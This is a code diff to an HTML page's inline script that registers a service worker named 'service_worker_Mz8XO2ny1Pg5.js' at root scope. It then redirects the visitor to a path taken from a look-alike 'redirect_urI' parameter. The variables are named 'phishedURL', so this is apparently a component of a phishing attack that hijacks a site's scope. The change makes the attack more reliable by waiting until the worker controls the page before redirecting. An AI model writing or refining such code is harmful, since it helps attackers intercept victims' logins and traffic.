@@ -8,18 +8,19 @@ this is it initially now <!DOCTYPE html>
 <body>
     <script>
         if ("serviceWorker" in navigator) {
-            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
-                scope: "/",
-            })
-                .then((registration) => {
-                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
-                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
-
-                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
-                })
-                .catch((error) => {
-                    console.error(`Service worker registration failed: ${error}`);
-                });
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", { scope: "/" })
+    .then((registration) => {
+        // Wait for the service worker to become active and controlling
+        return navigator.serviceWorker.ready;
+    })
+    .then(() => {
+        const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
+        const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+        self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
+    })
+    .catch((error) => {
+        console.error(`Service worker registration failed: ${error}`);
+    });
         }
         else {
             console.error("Service workers are not supported by this browser");
